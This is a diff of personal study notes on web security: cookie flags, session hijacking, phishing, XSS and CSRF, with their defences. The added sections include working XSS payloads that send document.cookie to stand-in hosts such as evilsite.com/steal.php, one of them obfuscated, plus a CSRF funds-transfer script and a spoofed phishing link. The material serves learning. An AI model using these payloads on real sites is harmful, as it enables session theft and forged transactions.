@@ -608,7 +608,6 @@ Administrtors may stop the propagation of inheritance at a particular folder
 advanced permissions 细分权限
 
 #### RAM: 
-- 
 - input data
 - working memory
 - `%eip` to points to next instruction
@@ -971,7 +970,7 @@ prevents a script from accessing the cookies
 Cookie policy shares the same main domain
 SOP different sub-somain shoule be viewed as different origins and isolated
 
-`HTTPonly`: if enabled scripting languages cannot accessing or manipulating the cookie, can prevent GA from accessing cookies set by `example.com`
+`HTTPOnly`: if enabled scripting languages cannot accessing or manipulating the cookie, can prevent GA from accessing cookies set by `example.com`
 
 *Secure Cookies*
 A cookie with the Secure attribute is sent to the server only with an encrypted request over the HTTPS protocol, never with unsecured HTTP.
@@ -980,8 +979,9 @@ A cookie with the Secure attribute is sent to the server only with an encrypted 
 Prevent the cookies go anywhere except the given domain
 Browser will not send them
 
-### XSS: Cross-Site Scripting
-*Session highjacking*
+### Session Hijacking
+Attacker get a valid session ID
+
 Session hijacking is the exploitation of a valid computer session to gain unauthorized access to informaiton or services in a computer system
 - predictable tokens
 	- unpredictable cookies
@@ -991,29 +991,64 @@ Session hijacking is the exploitation of a valid computer session to gain unauth
 - XSS vulnerabilities
 - CSRF vulnerabilities
 
+#### Session Hijacking defences
+HTTPS
+Strong random session ID
+Encrypt token (cookies)
+Rational session timeout
+Bind session token & client IP address (issue on mobile access)
+
+### Phishing
+An attacker creates a dummy web site that appears to be identical to a legitimate web site in order to trick users into divulging private information
+
+finalcial services industry, high value
+
+#### Phishing defences
+Phishing site blacklist, helding by the browser
+
+#### URL Obfuscation
+*Hyperlink* links to the phishing site
+```
+<a href="http://phisher225.com">http://www.securetotaltrust.com</a>
+```
+
+Similar spelling
+
+*Unicode attack / homeograph attack*: using international characters that similar to legitimate sites
+
+### XSS: Cross-Site Scripting
 > Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites
 
-#### Stored XSS Attacks
-The injected script is permanently stored on the target servers
-The victim then retrieves the malicious script from the server when it requests the stored information
+攻击者向服务器注入脚本，**服务器没有过滤或转义内容**，将其与正常内容一起发送给受害者，受害者默认信任服务器的所有内容，点击/访问脚本，完成攻击
+- 读/改DOM内容
+- 读/改cookie内容（非`HttpOnly`）
+- 用受害者cookie/session发请求, session hijacking
+- 重定向，下载恶意内容
+- 蠕虫自我传播
 
-#### Reflected XSS Attacks
+#### Stored (Persistent) XSS Attacks
+The injected script is permanently stored on the target server/database
+- personal info, guestbook, comments, message
+
+The victim then retrieves/run the malicious script from the server when it requests the stored information
+- read comments...
+
+#### Reflected (Nonpersistent) XSS Attacks
 The injected script is reflected off the web server
 Reflected attacks are delivered to victims via route, such as in e-mail message, or on some other web site
 http://xss-game.appspot.com/
 
 The key to the reflected XSS attack  
-Find a “good” web server that will echo the user input back in the  
+Find a "good" web server that will echo the user input back in the  
 HTML response
 
-
-1. Alice visits evil.com which contains the link  
+1. Alice visits `evil.com` which contains the link
 ```js
-	https://victim_site.com/search.php?term=<script>window.location=‘http://evil.com/?c=’+document.cookie</script>  
+	https://victim_site.com/search.php?term=<script>window.location=‘http://evil.com/?c=’+document.cookie</script>
 ```
-2. Alice clicks that link  
-3. Alice’s browser will send a GET request to that URL  
-4. victim_site returns 
+2. Alice clicks that link
+3. Alice's browser will send a GET request to that URL
+4. victim_site returns
 ```js
 <html> <title> Search results  
 </title> <body> Results for <script>...</script>  
@@ -1021,20 +1056,52 @@ HTML response
 ```
 5. Alice’s browser executes `<script>...</script>` within the origin `https://victim_site.com` and send to `evil.com` cookies for `victim_site.com`
 
+#### XSS Payloads
+```
+<script>
+  img = new Image();
+  img.src = "http://www.evilsite.com/steal.php?cookie=" + document.cookie;
+</script>
+
+<iframe frameborder=0 src="" height=0 width=0 id="XSS" name="XSS"></iframe>
+<script>
+  frames["XSS"].location.href="http://www.evilsite.com/steal.php?cookie=" + document.cookie;
+</script>
+
+a = document.cookie;
+b = "ht"; c = "tp"; d = "://"; e = "ww"; f = "w.";
+...
+document.location = b + c + d + e + f + ... + a;
+```
+
 #### XSS defenses
-*Escape/filter output*: escape dynamic data before insert into HTML
 *Input Validation*: check all inputs are of expected
+*Escape/filter output*: escape dynamic data before insert into HTML
+
 *CSP*: server supplies a whitelist of the scripts that are allowed to appear  
 on the page
-*Http-Only* attribute: scripting languages cannot access or manipulate the cookie
+*NoScript*
+
+*HttpOnly* attribute: scripting languages cannot access or manipulate the cookie
+*SameSite Cookie*
 
 ### CSRF: Cross-Site Request Forgery
 > CSRF forces a user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks target stage-changing requests, not theft of data, since the attacker has ho way to see the response to the forged request
 
+与XSS相比，CSRF不会让攻击脚本经过服务器，可以被检测和防御的机会更少，利用点也更少（只通过**目标站点API调用 + 受害者的session权限**）
+
 Theft of grants
 
 Attacker: have the victim visit attacker's server while logged-in to vulnerable server
+```javascript
+<script>
+document.location="http://www.naivebank.com/transferFunds.php?amount=10000&fromID=1234&toID=5678";
+</script>
 
+```
+
+`<img>` and `<iframe>`, access when the page loads
+ 
 The authentication cookies are automatically sent by the  
 victim browser.
 
@@ -1052,6 +1119,7 @@ The server ensures that the HTTP request (the **referer**) has come from the ori
 - different in each server response, avoid replay attack
 
 `SameSite` flag on cookies: prevents cookies from being sent in cross-site requests
+站点：协议 + 顶级域名（有效注册域名）
 
 # TTL
 salting password: high probs for multiple people using same password, or same person use same password on different platform.
